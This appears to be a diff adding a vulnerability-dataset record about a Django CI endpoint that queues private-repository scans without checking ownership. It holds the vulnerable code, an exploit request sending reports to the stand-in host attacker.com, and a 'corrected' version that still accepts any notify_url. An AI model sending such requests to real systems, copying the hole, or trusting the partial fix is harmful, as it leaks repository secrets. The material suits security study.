@@ -1,0 +1,8 @@
+{
+  "vulnerable_code": "@require_POST\ndef trigger_repo_security_scan(request):\n    data = json.loads(request.body)\n    repo_id = data.get('repo_id')\n    webhook_url = data.get('notify_url')\n    clone_and_audit_repo_task.delay(repository_id=repo_id, notify_url=webhook_url)\n    return JsonResponse({'status': 'queued'})",
+  "diagnosis": "The endpoint passes repo_id to a background task that clones the private repository using stored SSH deploy keys and sends analysis reports to notify_url. Without validating repo ownership, an attacker can trigger scans of private repos and exfiltrate secrets via the webhook.",
+  "exploit_request": "POST /api/ci/scan/ HTTP/1.1\nHost: ci.example.com\nAuthorization: Bearer <attacker_jwt>\nContent-Type: application/json\n\n{\"repo_id\": 402, \"notify_url\": \"https://attacker.com/leak\"}",
+  "corrected_code": "@require_POST\ndef trigger_repo_security_scan(request):\n    data = json.loads(request.body)\n    repo_id = data.get('repo_id')\n    get_object_or_404(Repository, id=repo_id, organization=request.user.organization)\n    webhook_url = data.get('notify_url')\n    clone_and_audit_repo_task.delay(repository_id=repo_id, notify_url=webhook_url)\n    return JsonResponse({'status': 'queued'})",
+  "severity": "HIGH",
+  "confidence": 0.96
+}
